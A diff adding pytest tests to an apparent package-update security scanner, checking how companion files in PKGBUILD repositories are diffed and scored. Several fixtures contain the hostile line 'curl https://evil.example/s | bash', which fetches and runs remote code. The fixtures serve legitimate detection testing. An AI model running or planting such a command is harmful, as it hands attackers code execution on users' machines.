@@ -480,6 +480,60 @@ def test_companion_hunk_reads_a_payload_committed_earlier(tmp_path):
     assert "+curl https://evil.example/s | bash" in hunk
 
 
+def _repo_with_two_revisions(tmp_path, first: dict[str, bytes],
+                             second: dict[str, bytes]):
+    repo = pygit2.init_repository(str(tmp_path / "r"))
+    who = pygit2.Signature("t", "t@e.x")
+    builder = repo.TreeBuilder()
+    for name, data in first.items():
+        builder.insert(name, repo.create_blob(data), pygit2.GIT_FILEMODE_BLOB)
+    one = repo.create_commit("HEAD", who, who, "1", builder.write(), [])
+    builder = repo.TreeBuilder(repo[one].tree)
+    for name, data in second.items():
+        builder.insert(name, repo.create_blob(data), pygit2.GIT_FILEMODE_BLOB)
+    two = repo.create_commit("HEAD", who, who, "2", builder.write(), [one])
+    return repo, str(one), str(two)
+
+
+def test_unchanged_companion_is_not_replayed_as_added(tmp_path):
+    """#49: a benign trap in an untouched script scored on every update."""
+    repo, old, new = _repo_with_two_revisions(tmp_path, {
+        "PKGBUILD": b"pkgver=1\nsource=('helper.sh')\n",
+        "helper.sh": b"trap 'rm -f \"$t\"' EXIT\n",
+    }, {
+        "PKGBUILD": b"pkgver=2\nsource=('helper.sh')\n",
+    })
+    hunk, cut = companion_source_hunks(repo, new, baseline_oid=old)
+    assert hunk == ""
+    assert not cut
+
+
+def test_changed_companion_scores_only_the_added_line(tmp_path):
+    repo, old, new = _repo_with_two_revisions(tmp_path, {
+        "PKGBUILD": b"pkgver=1\nsource=('helper.sh')\n",
+        "helper.sh": b"trap 'rm -f \"$t\"' EXIT\n",
+    }, {
+        "PKGBUILD": b"pkgver=2\nsource=('helper.sh')\n",
+        "helper.sh": b"trap 'rm -f \"$t\"' EXIT\ncurl -fsSL https://evil.example/s | bash\n",
+    })
+    hunk, cut = companion_source_hunks(repo, new, baseline_oid=old)
+    assert "+curl -fsSL https://evil.example/s | bash" in hunk
+    assert "+trap" not in hunk, "the unchanged trap line must not score again"
+    assert not cut
+
+
+def test_a_newly_referenced_companion_is_still_read_whole(tmp_path):
+    """The baseline must not hide a payload committed before the reference."""
+    repo, old, new = _repo_with_two_revisions(tmp_path, {
+        "PKGBUILD": b"pkgver=1\n",
+        "setup.sh": b"curl https://evil.example/s | bash\n",
+    }, {
+        "PKGBUILD": b"pkgver=2\nsource=('setup.sh')\n",
+    })
+    hunk, _cut = companion_source_hunks(repo, new, baseline_oid=old)
+    assert "+curl https://evil.example/s | bash" in hunk
+
+
 def test_a_blank_line_in_the_diff_does_not_crash_analysis():
     """A truly empty line used to reach ``line[0]`` in the signing-key and
     git-pin scanners: ``"" in "+- "`` is True, so the guard let an empty
@@ -508,6 +562,30 @@ def test_companion_content_makes_the_rules_fire(tmp_path):
     scanned = diff.rstrip("\n") + "\n" + companion_source_hunks(repo, commit)[0]
     fact = scan_diff(scanned, config=load_config(), package_name="demo", seen_urls={})
     assert "R001" in {e.rule_id for e in fact.score_breakdown}
+
+
+def test_unchanged_companions_add_no_score(tmp_path):
+    """End to end for #49: the untouched scriptlet, trap and service URL
+    contribute nothing to the update's score."""
+    from trustsight.analysis import scan_diff
+    from trustsight.config import ensure_default_configs, load_config
+
+    ensure_default_configs()
+    sources = b"source=('demo.install' 'helper.sh' 'demo.service')\n"
+    repo, old, new = _repo_with_two_revisions(tmp_path, {
+        "PKGBUILD": b"pkgver=1\n" + sources,
+        "demo.install": b"post_install() { echo done; }\n",
+        "helper.sh": b"trap 'rm -f \"$t\"' EXIT\n",
+        "demo.service": b"[Service]\nDocumentation=https://demo.github.io/docs/\n",
+    }, {
+        "PKGBUILD": b"pkgver=2\n" + sources,
+    })
+    companion, _cut = companion_source_hunks(repo, new, baseline_oid=old)
+    diff = "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1 +1 @@\n-pkgver=1\n+pkgver=2\n"
+    fact = scan_diff(diff + companion, config=load_config(),
+                     package_name="demo", seen_urls={})
+    fired = {e.rule_id for e in fact.score_breakdown}
+    assert not {"R007", "R099", "R152"} & fired
 
 
 # --- a checksum array added to under a context declaration -----------------
